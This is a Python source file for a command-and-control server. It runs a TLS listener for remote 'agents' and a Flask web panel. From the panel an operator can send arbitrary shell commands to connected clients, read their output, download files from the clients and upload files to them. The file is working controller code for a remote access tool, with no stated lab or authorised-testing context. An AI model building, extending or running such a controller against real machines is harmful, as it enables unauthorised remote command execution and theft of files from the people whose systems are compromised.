import socket
import threading
import time
from flask import Flask, render_template, request
from pathlib import Path
import ssl

class Server():
    
    """
    Server class responsible for managing client connections and handling a Flask web interface.
    It supports commands such as file uploads/downloads and remote execution of commands on clients.
    """
    
    def __init__(self):
        """
        Initializes the server with default IP and port settings, and sets up the Flask application
        along with necessary routes for handling web requests. Initializes lists for managing threads,
        command inputs/outputs, and IP addresses of connected clients.
        """
        self.server_IP = '127.0.0.1'
        self.server_PORT = 40000
        self.server_flask_port = 60000
        self.app = Flask(__name__)
        
        # Initialize Flask app and define routes
        self.app.add_url_rule('/', 'index', self.index)
        self.app.add_url_rule('/agents', 'agents', self.agents)
        self.app.add_url_rule("/<agentname>/executecmd", "agentnameexecutecmd", self.executecmd)
        self.app.add_url_rule("/<agentname>/execute", "agentnameexecute", self.execute, methods=['GET', 'POST']) 
        
        # Initialize thread management, command input/output, and IP lists
        self.threads_index = 0
        self.THREADS = [''] * 20  # Store threads (client connections)
        self.CMD_INPUT = [''] * 20  # Store input commands for clients
        self.CMD_OUTPUT = [''] * 20  # Store output received from clients
        self.IPS = [''] * 20  # Store IP addresses of connected clients

    def handle_connection(self, connection, address, thread_index):
        """
        Handles an individual client connection. This includes receiving commands from the client, sending
        commands from the server, and managing file uploads and downloads.

        Args:
            connection (socket): The client connection object.
            address (tuple): The client's IP address and port.
            thread_index (int): The index representing this client in the server's tracking lists.
        """
        # Dynamically grow the CMD_OUTPUT, CMD_INPUT, and IPS lists to accommodate new clients
        while len(self.CMD_OUTPUT) <= thread_index:
            self.CMD_OUTPUT.append('')  
        while len(self.CMD_INPUT) <= thread_index:
            self.CMD_INPUT.append('')  
        while len(self.IPS) <= thread_index:
            self.IPS.append('')  

        # Continuously receive commands and handle input/output for the specific connection

        while self.CMD_INPUT[thread_index] != 'quit':
            msg = connection.recv(4096).decode()    # Receive message from client
            self.CMD_OUTPUT[thread_index] = msg     # Store received message
            
            # Process input command from the server side
            while True:
                if self.CMD_INPUT[thread_index] != '':
                    if self.CMD_INPUT[thread_index].split(" ")[0] == 'download':
                        # Handle file download from client to server
                        filename = self.CMD_INPUT[thread_index].split(" ")[1].split('\\')[-1]
                        cmd = self.CMD_INPUT[thread_index]
                        connection.send(cmd.encode())
                        contents = connection.recv(4096*10000).decode()
                        f = open('.\\output\\' + filename, 'wb')
                        f.write(contents.encode())
                        f.close()
                        self.CMD_OUTPUT[thread_index] = f'File Transfer Complete! {filename} transferred!'
                        self.CMD_INPUT[thread_index] = ''
                    elif self.CMD_INPUT[thread_index].split(" ")[0] == 'upload':
                        # Handle file upload from server to client
                        cmd = self.CMD_INPUT[thread_index]
                        connection.send(cmd.encode())
                        filename = self.CMD_INPUT[thread_index].split(" ")[1]
                        filesize = self.CMD_INPUT[thread_index].split(" ")[2]
                        f = open('.\\output\\' + filename, 'rb')
                        contents = f.read()
                        f.close()
                        connection.send(contents)
                        msg = connection.recv(4096).decode()
                        if msg == 'File sent succesfully!':
                            self.CMD_OUTPUT[thread_index] = 'File sent succesfully!'
                            self.CMD_INPUT[thread_index] = ''
                        else:
                            
                            self.CMD_OUTPUT[thread_index] = 'An Error occured!'
                            self.CMD_INPUT[thread_index] = ''
                    # Send a general command to the client                        
                    else:
                        msg = self.CMD_INPUT[thread_index]
                        connection.send(msg.encode())
                        self.CMD_INPUT[thread_index] = ''
                        break
        
        # Close the connection once the 'quit' command is received
        self.close_connection(connection, thread_index)

    def close_connection(self, connection, thread_index):
        """
        Closes the connection with a client and performs cleanup by removing associated details
        from internal tracking lists.

        Args:
            connection (socket): The client connection object to close.
            thread_index (int): The index representing this client in the server's tracking lists.
        """
        
        connection.close() # Close the socket connection

        # Remove the agent details from THREADS, CMD_INPUT, CMD_OUTPUT, and IPS
        del self.THREADS[thread_index]
        del self.IPS[thread_index]
        del self.CMD_INPUT[thread_index]
        del self.CMD_OUTPUT[thread_index]

        # Re-append empty strings to maintain list size
        self.THREADS.append('')
        self.IPS.append('')
        self.CMD_INPUT.append('')
        self.CMD_OUTPUT.append('')

    def server_socket(self):
        """
        Starts the TLS server socket, binds it to the configured IP and port, and continuously listens for
        incoming client connections. Each connection is handled by a separate thread.
        """
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)         # Create a TCP socket
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)                       # Provides the protocol version for TLS
        context.load_cert_chain('.\\Certs\\certificate.pem', '.\\certs\\privkey.pem')   #Provides location for cert and key
        sslconn = context.wrap_socket(server_sock, server_side = True)          # Wraps the socket connection in the TLS
        sslconn.bind((self.server_IP, self.server_PORT))                        # Bind to IP and port
        sslconn.listen(5)                                                       # Start listening for incoming connections
        print(f'Server socket is running on {self.server_IP}:{self.server_PORT}')
        
        # Continuously accept new connections
        while True:
            connection, address = sslconn.accept()                              # Accept a new connection
            print(f"Connection received from {address}!")
            thread_index = len(self.THREADS)                                    # Get the index for this connection
            
            # Create a new thread to handle the connection
            t = threading.Thread(target=self.handle_connection, args=(connection, address, thread_index))
            t.daemon = True  # Mark the thread as a daemon so it exits when the main program exits
            self.THREADS.append(t)
            self.IPS.append(address)
            
            # Start the thread
            t.start()

    def index(self):
        """
        Renders the index page for the Flask web interface.

        Returns:
            Response: HTML template for the index page.
        """
        return render_template('index.html')
    
    def agents(self):
        """
        Renders the agents page, displaying connected agents and their details.

        Returns:
            Response: HTML template for the agents page.
        """
        return render_template('agents.html', threads=self.THREADS, ips=self.IPS)
    
    def executecmd(self, agentname):
        """
        Handles command execution for a specific agent by searching for its corresponding thread.

        Args:
            agentname (str): The name of the agent whose commands need to be executed.

        Returns:
            Response: HTML template for command execution or 404 if the agent is not found.
        """
        req_index = None
        # Find the correct thread associated with the agent
        for i in self.THREADS:
            if isinstance(i, threading.Thread) and hasattr(i, 'name'):
                if agentname in i.name:
                    req_index = self.THREADS.index(i)
                    break  # Stop once the correct thread is found
        if req_index is not None:
            return render_template('execute.html', name=agentname)
        else:
            return f"Agent {agentname} not found", 404
    
    def execute(self, agentname):
        """
        Executes a command on the specified agent, retrieves the output, and renders the result.

        Args:
            agentname (str): The name of the agent on which to execute the command.

        Returns:
            Response: HTML template displaying the command output.
        """
        if request.method=='POST':
            cmd = request.form['command']
            for i in self.THREADS:
                if isinstance(i, threading.Thread) and hasattr(i, 'name'):
                    if agentname in i.name:
                        req_index = self.THREADS.index(i)
                        break
            self.CMD_INPUT[req_index] = cmd
            time.sleep(1)
            cmdoutput = self.CMD_OUTPUT[req_index]
            return render_template('execute.html', cmdoutput=cmdoutput, name=agentname)
              
    def start_flask(self):
        """
        Starts the Flask application on the configured IP and port in a separate thread.
        """
        print(f"Starting Flask app on {self.server_IP}:{self.server_flask_port}")
        self.app.run(host=self.server_IP, port=self.server_flask_port, threaded=True)

    def run(self, debugging=True):
        """
        Starts both the server socket and the Flask web interface, each in separate threads.
        Keeps the main program running to ensure both threads remain active.

        Args:
            debugging (bool): Whether to run in debugging mode (default is True).
        """
        # Start server_socket in a separate thread
        socket_thread = threading.Thread(target=self.server_socket)
        socket_thread.daemon = True  # Make the socket thread a daemon
        socket_thread.start()
        
        # Start Flask app in a separate thread
        flask_thread = threading.Thread(target=self.start_flask)
        flask_thread.daemon = True  # Make the Flask thread a daemon
        flask_thread.start()

        # Keep the main program running while the threads are active
        try:
            while True:
                pass  # Keep the main program alive to handle connections
        except KeyboardInterrupt:
            print("\nServer shutting down...")

    
if __name__ == '__main__':
    my_app = Server()
    my_app.run()